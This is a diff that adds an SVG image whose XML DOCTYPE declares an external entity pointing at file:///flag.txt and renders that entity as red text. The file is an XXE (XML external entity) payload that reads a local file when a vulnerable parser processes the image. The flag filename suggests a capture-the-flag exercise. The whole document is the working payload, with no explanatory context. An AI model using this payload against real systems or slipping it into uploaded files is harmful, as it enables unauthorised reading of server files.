@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE document [ <!ENTITY foo SYSTEM 'file:///flag.txt'> ]>
+<svg
+   xmlns="http://www.w3.org/2000/svg"
+   width="200mm"
+   height="10mm">
+   <text x="10" y="15" fill="red">
+      &foo;
+   </text>
+</svg>
